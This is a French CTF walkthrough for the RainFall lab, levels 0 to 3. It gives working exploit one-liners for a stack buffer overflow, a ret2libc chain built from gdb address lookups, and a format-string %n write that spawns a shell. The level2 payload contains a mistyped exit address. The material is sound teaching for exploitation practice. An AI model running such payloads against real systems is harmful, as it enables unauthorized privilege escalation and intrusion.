On va surtout exploiter les buffers overflows
Dans cette docu tu trouveras pour chaque exercice, une indication de quelle faille il faut exploiter, suivi d'un spoiler sur comment on l'exploite suivi de la solution

Les flags se trouve toujours quand tu vas reussir a ouvrir un shell via la faille
Verifie dabord avec whoami si cest bien le user que tu veux et le flag se trouve 
`cat /home/user/levelX/.pass `

Pour le level0

On a juste un fichier ELF
Decompile le et tu trouveras le principe

Spoiler

Si tu regardes le fichier level0.c, tu remarqueras que on rentre dans un shell lorsque l'argument passe est un nombre

Solution

./level0 423

Pour le level1

On decompile comme dhab. On renarque quil y a une fonction run qui nest jamais appele et que le main fait juste un get qui le stock dans une variable de 76 chars. Exploit -> Stack-Based Buffer Overflow - Basic
Spoiler 

On va chercher l'address de run
level1@RainFall:~$ objdump -d -M intel level1 | grep run
08048444 <run>:

Objectif -> mettre cette address a la fin de la string passe dans le gets
IMPORTANT ! A chaque fois quon a une address, il faut la mettre en little endian
soit 0x08048444 = "\x44\x84\x04\x08"

Solution

level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1 

Pour le level2

La fonction p() est appellee. gets est dangereux car aucune limite de taille
Faille -> Stack-Based Buffer Overflow - Ret2Libc
Quest ce que la faille Ret2Libc ? Ca sert a utilise la lib qui est compilee dans le programme pour prendre les fonctions quon veut qui se trouve dedans mais qui nest pas utilisee par le programme

Spoiler

On va chercher la ou se trouve les fonctions system, exit, et la strings "/bin/sh"

Comment faire ca ?
On va utiliser gdb ./level2

On va dabord calculer l'offset via le site fourni en annexe
Donc on fait run
puis on inject 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Puis on retourne sur le site laddress du segfault : 0x37634136

Offset = 80

Donc on print 80 chars avant de faire notre overflow
Quest ce quon met apres ? 
On commence par mettre la fonction system :
dans gdb tu fais un breakpoint au main puis tu run
puis `p system` = 0xb7e6b060

Ensuite on va chercher la fonction exit
`p exit` = 0xb7e5ebe0

Ok maintenant on va chercher les arguments pour system soit /bin/sh

Ca se trouve dans une lib, pour voir ou sont les libs on fait
`info proc map`

```(gdb) info proc map
process 2612
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so         <------------------
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) 
```

Avec ceci on voit tout ce qui a ete load
On voit qu'un fichier a une grosse taille -> 0x1a3000
Ce fichier ca commence a 0xb7e2c000 et fini 0xb7fcf000
Pour trouver /bin/sh on continue avec gdb on fait la commande
`find 0xb7e2c000, 0xb7fcf000, "/bin/sh"`

First arg = le debut du find
Second arg = La fin du find
Third arg = Ce quon veut chercher qui peut se trouver dans les 2 args precedents

on trouve alors 

```(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) 
```

Or il nous manque plus quun argument pour que ca ne crash pas -> la fonction de return de fin du main
On a juste a disass le main sur gdb :
`disass main`

Et on trouve ca :

```
(gdb) disass main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
=> 0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret                     // <------------
End of assembler dump.
(gdb) 
```

Le ret se trouve a 0x0804854b

Donc on a tout notre payload pour pouvoir faire notre commande finale
Mais dans quelle ordre ?
Dabord notre offset de 80, puis notre return, puis notre system, puis notre exit, puis notre /bin/sh
Soit 0x0804854b, 0xb7e6b060, 0xb7e5ebe0, 0xb7f8cc58

Solution
level2@RainFall:~$ (python -c 'print "a" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" +  "\xe0\xeb\x5e\x7e" + "\x58\xcc\xf8\xb7" '; cat) | ./level2 


level3

On a donc une fonction v() ainsi quune variable globale. On arrive dans le shell quand m a une certaine valeur. Faille : Format String Vulnerability - 1st method (using python)
En gros ca prend ton parametre et le mets dans un printf en brut, tu peux lexploiter 
Exemple :
level3@RainFall:~$ ./level3 
%p
0x200
level3@RainFall:~$ 


Donc on va deja chercher sur quel registre (cest a dire quelle argument sur la pile) se trouve nos arguments


Spoiler

Si on met en arg
level3@RainFall:~$ ./level3 
AAAA %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
level3@RainFall:~$ 

0x41414141 = "AAAA"

Donc cest le 4eme argument

On va exploiter printf aussi avec un flag -> %n et $[une variable]

En gros %n ca va ecrire le nombre de characteres qui ont ete ecrit avant sur la variable quon donne en argument (ici le 4eme argument)

On va chercher aussi l'address de m avec gdb
Donc go desass v et on cherche parmis les registres et les address lesquelles peuvent correspondre a m :

```(gdb) disass v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax         <------------
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
---Type <return> to continue, or q <return> to quit---
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
(gdb) 
```

A 0x080484da, on met une address dans le registre eax, cette address cest 0x804988c
Si on veut verifier si cest bien ca on fait la commande gdb :
```(gdb) x/s 0x804988c
0x804988c <m>:	 ""
(gdb) 
```

Parfait on va pouvoir faire notre payload
Dabord laddresse de m, puis ce quon veut mettre dedans sachant que m doit etre = a 64
Donc on print m, on met juste 60 chars pour remplir pour quen dernier on appelle %n qui donnera 60 + 4 (cest les 4 de laddress de m)
Puis on met ca dans notre 4eme argument

Solution :
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"'; cat) | ./level3 



Pour le level4





https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
